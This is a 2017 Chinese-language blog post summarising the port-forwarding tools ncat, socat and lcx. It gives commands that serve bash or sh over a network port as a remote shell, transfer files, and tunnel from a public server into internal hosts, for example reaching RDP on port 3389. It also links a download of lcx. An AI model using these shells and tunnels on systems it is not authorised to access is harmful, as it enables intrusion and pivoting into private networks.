---
date: "2017-07-31T00:00:00Z"
description: 介绍几款端口转发工具
title: 端口转发工具小结
url: /archivers/2017-07-31/1
---


## 0X00 ncat

### 反弹shell

服务器：`ncat -lnv -c bash 4489`  将bash转发到4489端口

客户端：`ncat -nv 172.17.0.1 4489` 连接到目标的4489即可获得交互式bash

Windows下用 `-c C:\windows\system32\cmd.exe`

参数介绍：

|`-l,--listen <port>` | 监听某个端口
| `-n, --nodns`　     |不通过DNS解析主机名
| `-v,--verbose`      |设置的详细程度(可以使用几次)
| `-c,--sh-exec`      | 执行传递的命令行

### 建立聊天室

服务端：`ncat -lnv --broker --chat 8432`

客户端：`ncat -nv 172.17.0.1 8432`

参数介绍：

| `--broker` | 使用ncat的代理连接模式，允许多个组织连接到ncat的服务器和其他人交流，ncat能创建一个经纪人在连接和系统之间通过NAT或者其他的直接连接。这个选项是和监听模式一起使用的。这会使监听端口的经纪人模式启动
| `--chat`   |　开启一个简单的ncat聊天服务器

### 采用SSL加密

* 服务器：`ncat -lnv -c bash 4489 --ssl`
* 客户端：`ncat -nv 172.17.0.1 4489 --ssl`

### 传输文件

服务端：
```
root@Kali:~$ ncat -lnv 1788 > tmp.txt
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::1788
Ncat: Listening on 0.0.0.0:1788
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:48004.
```

客户端：
```
root@504d96ae69cc:/docker_files# cat tmp.txt 
hello :)
root@504d96ae69cc:/docker_files# ncat -nv 172.17.0.1 1788 < tmp.txt 
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 172.17.0.1:1788.
Ncat: 9 bytes sent, 0 bytes received in 0.01 seconds.
root@504d96ae69cc:/docker_files# 
```


### 参数列表(中文)

[ncat参数](/tools/ncat.txt)

## 0x01 socat

### 安装

```bash
wget http://www.dest-unreach.org/socat/download/socat-2.0.0-b9.tar.gz
tar xvf socat-2.0.0-b9.tar.gz
cd socat-2.0.0-b9
./configure
make
make install
```


### 建立通信(聊天室)

| 服务端 | `socat - tcp4-listen:4444`
| 客户端 | `socat tcp:SERVER_IP:4444`

### 传输文件

| 服务端 | `socat tcp4-listen:4444 open:data.txt,creat,append` |
| 客户端 | `cat test.txt | socat - tcp:SERVER_IP:4444` |

> 传输二进制文件需要将append改成binary

### 反弹Shell

| 服务端 | `socat tcp-l:4444 exec:sh,pty,stderr`
| 客户端 | `socat - tcp:SERVER_IP:4444`
| tcp-l 是 `tcp4-listen` 的简写

### 端口转发

`socat - tcp-l:8888,fork tcp4:192.168.3.1:4477`

当本机接收到8888端口的数据，将全部转发给192.168.3.1主机上的4477端口

### UDP通信

| 服务端 | `socat - udp-l:4456` |
| 客户端 | `socat - udp-datagram:192.168.3.1:4456`
| 

### 公网转发到内网

| 服务端 | `socat tcp-listen:1234 tcp-listen:22` | 外网IP(`60.*.*.*`)
| 客户端 | `socat tcp:60.*.*.*:1234 tcp:192.168.3.1:22` | 内网IP(192.168.3.1)

### 内网转发到公网

```
                  ------------
                 |   Server   |
                 |  60.*.*.*  |
                  ------------
                 /            \
          {|<Firewall>|}    {|<Firewall>|}
                |                 |
          --------------      ----------------        
         | (192.168.3.1)|     | (192.168.3.2) |
          --------------      ----------------
       (hosting a service    (wanting to access
         on port 4200)         Client A port 4200)
```

| 服务端 | `socat - tcp-l:10000 tcp-l:4200`
| 客户端 | `socat tcp4:60.*.*.*:10000 tcp4:localhost:4200`

### 参考文档

[socat使用手册](/tools/socat)

## 0x02 lcx（go语言编写）

被控端192.168.10.2 ：

lcx <公网IP> 123

控制端 111.111.111.111：

lcx 456 123 192.168.10.2 3389

此时访问111.111.111.111的456就等于192.168.10.2:3389

[Download](http://www.secpulse.com/wp-content/uploads/2015/05/lcx._g.rar)
[相关文章](https://www.secpulse.com/archives/6341.html)




